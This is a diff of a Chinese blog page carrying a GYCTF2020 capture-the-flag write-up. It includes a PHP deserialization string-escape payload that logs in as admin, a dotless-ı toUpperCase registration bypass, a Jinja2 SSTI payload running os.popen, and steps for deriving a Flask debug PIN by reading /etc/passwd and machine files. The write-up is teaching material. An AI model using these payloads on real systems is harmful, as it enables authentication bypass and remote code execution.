@@ -54,7 +54,7 @@
           
           
           <li class="nav-item">
-            <a class="nav-link" href="/">Home</a>
+            <a class="nav-link" href="/">首页</a>
           </li>
         
           
@@ -62,7 +62,7 @@
           
           
           <li class="nav-item">
-            <a class="nav-link" href="/archives/">Archives</a>
+            <a class="nav-link" href="/archives/">归档</a>
           </li>
         
           
@@ -70,7 +70,7 @@
           
           
           <li class="nav-item">
-            <a class="nav-link" href="/categories/">Categories</a>
+            <a class="nav-link" href="/categories/">分类</a>
           </li>
         
           
@@ -78,7 +78,7 @@
           
           
           <li class="nav-item">
-            <a class="nav-link" href="/tags/">Tags</a>
+            <a class="nav-link" href="/tags/">标签</a>
           </li>
         
           
@@ -86,7 +86,7 @@
           
           
           <li class="nav-item">
-            <a class="nav-link" href="/about/">About</a>
+            <a class="nav-link" href="/about/">关于</a>
           </li>
         
         
@@ -353,9 +353,10 @@ class dbCtrl
 $o = new UpdateHelper;
 echo serialize($o);
 </code></pre>
-<p>运行得到如下payload:</p>
-<pre><code>O:12:&quot;UpdateHelper&quot;:1:{s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:{s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:{s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;}}}}
-</code></pre><p>下面我们就需要思考如何将脚本得到的序列化串被程序反序列化呢？</p>
+<p>运行得到如下payload：</p>
+<pre><code class="python">O:12:&quot;UpdateHelper&quot;:1:{s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:{s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:{s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;}}}}
+</code></pre>
+<p>下面我们就需要思考如何将脚本得到的序列化串被程序反序列化呢？</p>
 <p>先找一下反序列化的利用点，从 update.php 可以跟进到<code>User</code>类的<code>update()</code>函数:</p>
 <pre><code class="php">public function update()
 {
@@ -386,17 +387,16 @@ echo serialize($o);
 <p>所以要想反序列化我们的payload，就得控制<code>Info</code>类对象的序列化串，看一下这个序列化串的格式（假设age为20，nickname为lethe）：</p>
 <pre><code>O:4:&quot;Info&quot;:3:{s:3:&quot;age&quot;;s:2:&quot;20&quot;;s:8:&quot;nickname&quot;;s:5:&quot;lethe&quot;;s:8:&quot;CtrlCase&quot;;N;}
 </code></pre><p>我感觉这里原理上有点类似注入，需要闭合构造符合规则的序列化串。</p>
-<p>假设我们要通过nickname参数来注入，先看一下我们构造的payload2如下（未逃逸字符串前）:</p>
-<pre><code>&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:{s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:{s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:{s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;}}}}}
-</code></pre><p>可以看到我们在而已序列化串前加上了<code>&quot;;s:8:&quot;CtrlCase&quot;;</code>，在最后加上了一个<code>}</code>（整个长度为263），这样我们将其作为<code>new Info($age,$nickname)</code>的nickname传入时，序列化的结果如下：</p>
-<p>![在这里插入图片描述](GYCTF2020-Writeup/20200225135058986.png</p>
-<p>上图中两个箭头之间的内容就是我们传入的payload，可以看到我们在第一个箭头那里是想闭合双引号，从而使后面的内容符合序列化的规则的。但是我圈出来的那个263在序列化的规则里，限制了nickname的长度为263，所以后面长度为263的payload还是当作了一个普通字符串，而不是序列化里的内容。</p>
-<p>这时候就需要用到字符逃逸的原理了，我们在payload2的前面加上263个<code>union</code>，这样我上面圈出来的值就变成了$263×5+263=1578$，上面第一个箭头所指的双引号里是263个<code>union</code>(长度为$263×5=1315$)，当对这个序列化串进行<code>safe()</code>函数的处理时，所有的<code>union</code>都被替换成了<code>hacker</code>，也就是双引号里的内容变成了263个<code>hacker</code>（长度为$263×6=1578$），正好等于前面的1579，如下：</p>
-<p><img src="/2020/03/06/GYCTF2020-Writeup/20200225140946410.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>假设我们要通过nickname参数来注入，先看一下我们构造的payload2如下（未逃逸字符串前）：</p>
+<pre><code class="python">&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:{s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:{s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:{s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;}}}}}
+</code></pre>
+<p>可以看到我们在而已序列化串前加上了<code>&quot;;s:8:&quot;CtrlCase&quot;;</code>，在最后加上了一个<code>}</code>（整个长度为263），这样我们将其作为<code>new Info($age,$nickname)</code>的nickname传入时，序列化的结果如下：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200225135058986.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>上图中两个箭头之间的内容就是我们传入的payload，可以看到我们在第一个箭头那里是想闭合双引号，从而使后面的内容符合序列化的规则的。但是我圈出来的那个263在序列化的规则里，限制了nickname的长度为263，所以后面长度为263的payload还是当作了一个普通字符串，而不是序列化里的内容。</p>
+<p>这时候就需要用到字符逃逸的原理了，我们在payload2的前面加上263个<code>union</code>，这样我上面圈出来的值就变成了$263×5+263=1578$，上面第一个箭头所指的双引号里是263个<code>union</code>(长度为$263×5=1315$)，当对这个序列化串进行<code>safe()</code>函数的处理时，所有的<code>union</code>都被替换成了<code>hacker</code>，也就是双引号里的内容变成了263个<code>hacker</code>（长度为$263×6=1578$），正好等于前面的1579，如下：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200225140946410.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>上面的图可以看出来经过safe()函数处理后，这个序列化串就被解释成了nickname变量长度为1586的重复<code>hacker</code>字符串，而我们的而已序列化payload，则以对象的形式作为CtrCase变量的值。<br>而之所前面构造的时候在最后面加一个<code>}</code>，是因为<code>Info</code>类的对象只有3个变量（第一个箭头所指），当到我们第二个箭头所指的位置时，前面已经有3个变量满足了序列化串的要求了，所以加一个<code>}</code>来闭合整个序列化串。这样由于前面的内容已经符合反序列化的规则，所以后面的内容都将被忽略。</p>
 <p>最终payload如下：</p>
-<pre><code>age=1&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:{s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:{s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:{s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;}}}}}
-</code></pre><p>在update.php以POST传入上面的payload，此时反序列化被执行，在login函数里面已经成功验证了，token被设置为了<code>admin</code>，所以再回到登录界面使用任意密码即可登录admin账户：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200225013210183.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
+<pre><code class="python">age=1&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:{s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:{s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:{s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;}}}}}
+</code></pre>
+<p>在update.php以POST传入上面的payload，此时反序列化被执行，在login函数里面已经成功验证了，token被设置为了<code>admin</code>，所以再回到登录界面使用任意密码即可登录admin账户：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200225013210183.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
 <h1><span id="ez_expresss">Ez_Expresss</span></h1><p>存在<a href="http://www.zip源码泄露，可以下载得到源码。" target="_blank" rel="noopener">www.zip源码泄露，可以下载得到源码。</a></p>
 <p>在登录界面，有如下提示：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200305234711800.png" srcset="/img/loading.gif" alt><br>这里只支持大写非常的奇怪，查阅资料得到：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200305234811798.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>再查看源码，确实是使用了toUpperCase()进行处理，所以可以利用这个特性来注册<code>admın</code>用户进行绕过：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306000532187.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>可以看到成功了，并且提示flag在/flag目录下。<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306000712785.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
@@ -429,13 +429,10 @@ echo serialize($o);
 </code></pre>
 <pre><code class="python">{{''.__class__.__base__.__subclasses__()[77].__init__.__globals__['sys'].modules['o'+'s'].__dict__['po'+'pen']('cat /this_is_the_fl'+'ag.txt').read()}}
 </code></pre>
-<p>将payload进行base64编码，再在题目中解码触发SSTI进行RCE：</p>
-<p><img src="/2020/03/06/GYCTF2020-Writeup/20200306172255728.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>将payload进行base64编码，再在题目中解码触发SSTI进行RCE：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306172255728.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <h4><span id="预期解利用pin码进行rce">预期解：利用PIN码进行RCE</span></h4><p>参考这篇文章：<a href="https://www.anquanke.com/post/id/197602" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197602</a></p>
 <p>要想生成PIN码，我们需要获得下面几个信息，这里就不考虑RCE了，所需要的信息均可以通过读文件来获得：</p>
-<p>（1）服务器运行flask所登录的用户名。通过读取/etc/password可知此值为：<code>flaskweb</code></p>
-<p><img src="/2020/03/06/GYCTF2020-Writeup/20200306182207863.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
-<p>（2）modname的值。一般不变就是<code>flask.app</code></p>
+<p>（1）服务器运行flask所登录的用户名。通过读取/etc/password可知此值为：<code>flaskweb</code><br><img src="/2020/03/06/GYCTF2020-Writeup/20200306182207863.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>（2）modname的值。一般不变就是<code>flask.app</code></p>
 <p>（3） <code>getattr(app, &quot;__name__&quot;, app.__class__.__name__)</code>的结果。就是<code>Flask</code>，也不会变</p>
 <p>（4）flask库下app.py的绝对路径。在报错信息中可以获取此值为： <code>/usr/local/lib/python3.7/site-packages/flask/app.py</code><br><img src="/2020/03/06/GYCTF2020-Writeup/20200306182459368.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>（5）当前网络的mac地址的十进制数。通过文件<code>/sys/class/net/eth0/address</code>读取，eth0为当前使用的网卡：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306182704459.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>将<code>0242ae00ecc2</code>转换为10进制为：<code>2485410393282</code></p>
 <p>（6）机器的id。</p>
@@ -702,7 +699,7 @@ print(requests.get(
     <div class="d-none d-lg-block col-lg-2 toc-container">
       
   <div id="toc">
-    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
     <div id="tocbot"></div>
   </div>
 
@@ -759,7 +756,7 @@ print(requests.get(
   <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
     <div class="modal-content">
       <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
         <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
           <span aria-hidden="true">&times;</span>
         </button>
@@ -767,7 +764,7 @@ print(requests.get(
       <div class="modal-body mx-3">
         <div class="md-form mb-5">
           <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
         </div>
         <div class="list-group" id="local-search-result"></div>
       </div>
